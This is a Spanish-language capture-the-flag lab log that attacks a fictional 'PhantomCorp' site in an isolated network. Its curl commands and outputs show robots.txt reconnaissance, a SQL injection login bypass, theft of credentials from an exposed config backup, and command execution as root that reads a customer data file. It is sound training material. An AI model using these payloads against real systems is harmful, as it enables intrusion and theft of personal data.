# Bitácora de comandos — PhantomCorp "Clientes"

Entorno: `./ctf lab final` (`cyberlab-attacker` + `cyberlab-phantomcorp`, red
`labnet` aislada, sin puertos publicados al host). Todos los comandos se
ejecutaron desde la consola atacante (`make shell`).

## R1 — Recon / enumeración

```
$ curl -s http://phantomcorp/robots.txt
User-agent: *
Disallow: /portal-rrhh

$ curl -s http://phantomcorp/portal-rrhh
<!doctype html><title>Portal RRHH PhantomCorp</title><h1>Portal interno RRHH</h1>
<form method=post action=/portal/login><input name=user><input name=pass type=password></form>
<!-- recon: portal interno localizado. FLAG{final_recon_portal} -->
```

`robots.txt` es un mapa de lo que el sitio *no quiere* que se vea indexado —
nunca un control de acceso. Encontramos el portal "oculto" sin fuzzing: nos
lo dijo el propio servidor.

## R2 — Explotación (SQLi auth bypass)

```
$ curl -s -X POST http://phantomcorp/portal-rrhh/login \
    --data-urlencode "user=admin' -- " \
    --data-urlencode 'pass=x'
Bienvenido admin. Dashboard RRHH.
FLAG{final_sqli_foothold}
Backup de config disponible en: /backup/rrhh.conf
```

Control negativo (credenciales inválidas, sin inyección):
```
$ curl -s -X POST http://phantomcorp/portal-rrhh/login \
    --data-urlencode 'user=admin' --data-urlencode 'pass=wrongpass' \
    -o /dev/null -w '%{http_code}\n'
401
```

La consulta del backend es `SELECT user, rol FROM users WHERE user='<user>'
AND pass='<pass>'` armada por concatenación. `admin' -- ` cierra el literal y
comenta el resto de la cláusula (incluido el chequeo de password), por lo que
la query equivale a `... WHERE user='admin'` y siempre matchea a admin.

## R3 — Post-explotación (loot del token)

```
$ curl -s http://phantomcorp/backup/rrhh.conf
DB_USER=rrhh_app
DB_PASS=Rh-2026
API_TOKEN=phantom-api-7c1e
# usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}
```

El dashboard del hito anterior señaló esta ruta (`/backup/rrhh.conf`): un
backup de configuración servido tal cual por HTTP, sin autenticación, con
credenciales de DB y el token de una API interna en texto plano.

## R4 — Impacto (RCE gateada por el token → crown jewels)

Control negativo (token inválido):
```
$ curl -s -o /dev/null -w '%{http_code}\n' \
    'http://phantomcorp/api/reporte?token=wrong&cmd=id'
403
```

Con el token looteado:
```
$ curl -s 'http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id'
$ id
uid=0(root) gid=0(root) groups=0(root)

$ curl -s --data-urlencode 'cmd=cat /app/priv/clientes.db.txt' -G \
    'http://phantomcorp/api/reporte' --data-urlencode 'token=phantom-api-7c1e'
$ cat /app/priv/clientes.db.txt
clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
```

El endpoint pasa el parámetro `cmd` directo a `os.popen()`: el "token" no es
una barrera de autorización real, solo una ofuscación — una vez looteado, el
endpoint es RCE sin restricciones y el proceso corre como root dentro del
contenedor. Con eso se exfiltra el archivo con los datos de clientes
(48.210 registros: nombre, DNI, tarjeta) — los crown jewels del alcance.

## Cierre

```
$ ./ctf submit final R1 'FLAG{final_recon_portal}'
$ ./ctf submit final R2 'FLAG{final_sqli_foothold}'
$ ./ctf submit final R3 'FLAG{final_token_looted}'
$ ./ctf submit final R4 'FLAG{final_crown_jewels}'
$ ./ctf status final
```
Ver [`ctf-status-final.txt`](ctf-status-final.txt) — 4/4 (100%).
